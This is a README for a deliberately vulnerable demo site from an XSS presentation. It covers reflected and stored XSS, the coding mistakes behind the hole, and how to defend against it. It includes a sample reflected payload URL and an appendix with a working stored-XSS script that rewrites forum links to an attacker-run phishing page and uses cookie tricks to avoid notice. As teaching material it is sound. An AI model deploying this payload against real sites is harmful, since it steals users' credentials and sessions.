# xss-demo-aug-2019
A (deliberately!) broken site to demonstrate the power of XSS exploitation.

# Stored XSS vulnerabilities
## Presentation structure
1. Definition of stored and reflected XSS attacks
1. Demo of XSS in a web app
1. Explanation of how XSS happened in the demo
1. Steps developers can take to protect against XSS
1. Wider implications and dangers of XSS

## Definition of XSS
### Reflected
Reflected XSS occurs when an attacker crafts a URL containing a parameter or path that will be displayed in a target browser. The attacker usually tricks a target user into clicking on this malicious URL, and can then gain access to the user's browser through a script within the URL. and example of this could be the URL:

`https://www.example.com?search=<script>alert("boo!");</script>cat%20pictures`
### Stored
Stored XSS happens when an attacker can directly upload HTML to a site through a user input field whose contents will be displayed elsewhere on the site, such as a username field. If the input is not escaped by the server, there is a risk it will be rendered as HTML, which means outside scripts can be injected into the page.

_This demo focuses solely on stored XSS attacks_

## Demonstration
The demo app has three fields (of which one has been left vulnerable) where users can input information which will be displayed elsewhere on the site:
- Username
- Post titles
- Post bodies

## How XSS happened in the demo app
Generally speaking, the cause of stored XSS is failure to escape user input. In the case of this app, two lines of code were responsible for the vulnerability:
1. Neglecting to user the `xss` node module to sanitise the input: [/routes/index.js#L59](https://github.com/phoebe-bee/xss-demo-aug-2019/blob/a47b1d299013536888f4b850ea5b667f36c89798/routes/index.js#L59)
1. Using the wrong number of braces in the handlebars template, causing the template to render the variable without escaping the value: [/views/forum_dashboard.hbs#L18](https://github.com/phoebe-bee/xss-demo-aug-2019/blob/a47b1d299013536888f4b850ea5b667f36c89798/views/forum_dashboard.hbs#L18)

## How developers can protect against XSS
As the above section would suggest, the way to avoid XSS is to ensure all user input is escaped before it reaches the browser so there is no possibility it will be rendered as HTML. However in practice this can be easier said than done, particularly in a complex web app.

Developers can introduce coding standards such as prefixing their variable names with whether they are safe or unsafe, (example detailed in this article ["Making wrong code look wrong"](https://www.joelonsoftware.com/2005/05/11/making-wrong-code-look-wrong/)) to reduce the likelihood that unescaped text will make it to the browser. Good code review practices can help maintain these coding standards, too.

There is also the standard solution of not trying to roll your own security: if you can rely on trusted frameworks which you keep up to date, you can mitigate some amount of risk. For example: the templating engine I used to make this site is hard to slip XSS by, as the default behaviour is to always escape values it is asked to display.

## Wider implications and dangers of XSS
When a potential XSS vulnerability is found during a pentest, we tend to add a simple script such as `alert(1);`. The truth is, though, that some incredibly malicious code can be contained within the script tags.

Any information viewable by the browser, such as session and CSRF protection tokens, are accessible any script running on the page. This means if an attacker can inject their own script into the page, they will be able to steal sessions and perform actions masquerading as legitimate users. All user accountability goes out of the window - how can you know if it really is an admin going rogue and deleting half the site, or if they went to an infected page and had their session stolen?

I would argue that even data which is supposed to be inaccessible to the browser, such as passwords, is retrievable with the right script. A version of the annotated script below changes the hyperlinks on a page to send people to the site of an attacker's choice... for example, a phishing site made to look like an 'oops, please log back in page' from the original site.

It's bad enough when you consider that a phishing attack could hand user credentials over to malicious actors, but when taken into account how many people re-use passwords between accounts, it's horrifying how much damage could be done with this relatively simple script.

## Appendix: Commented phishing script from demo

<script type = "text/javascript">
$(document).ready(function () {
  function getCookie(n) {
    // returns the value of a named cookie
    var name = n + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(";");
    for (var i = 0; i < ca.length; i++) {
      var c = ca[i];
      while (c.charAt(0) == " ") {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return "";
  }

  function setCookie() {
    // Make a new cookie called 'h' (for 'harvested') which pulls the first, middle and last chars from the session ID
    // This will be used to check if the session ID has been updated and needs to be stored
    // using 3 check chars is less suspicious than storing the entire session ID
    var sid = getCookie("connect.sid");
    document.cookie = "h="+ sid.charAt(0) + sid.charAt(sid.length - 1) + sid.charAt((sid.length -1)/2) + ";expires=session;path=/";
  }

  function isNewSession() {
    // Check the value of 'h' against the current session ID
    var sid = getCookie("connect.sid");
    var h = getCookie("h");
    if (h === sid.charAt(0) + sid.charAt(sid.length - 1) + sid.charAt((sid.length -1)/2)) {
      return false;
    } else {
      return true;
    }
  }

  var current_page_path = window.location.pathname;
  // If the session ID is one we've seen before, don't replace the hyperlinks.
  // That way the redirect to the 'login' page looks like a one-off error to
  // the user, and we don't collect the same session ID more than once
  if (!current_page_path.includes("/post") && isNewSession()) {
    // Only run the script on the forum home page, leave individual post pages
    // alone
    $("td > a").each(function(i) {
      console.log(document.cookie);
      var original_path = $(this).attr("href");
      var hostname = window.location.hostname;
      // Replace all links in the table of posts with links to the phishing site
      // Pass along the ID of the post the user was trying to see (so we can
      // direct them back to it after 'logging them back in')
      var new_href = "http://" + hostname + ":1337" + original_path;
      $(this).prop("href", new_href);
    });
    setCookie();
  }
});
// Don't forget to add a normal-looking title so people don't get suspicious!
</script>Important announcement
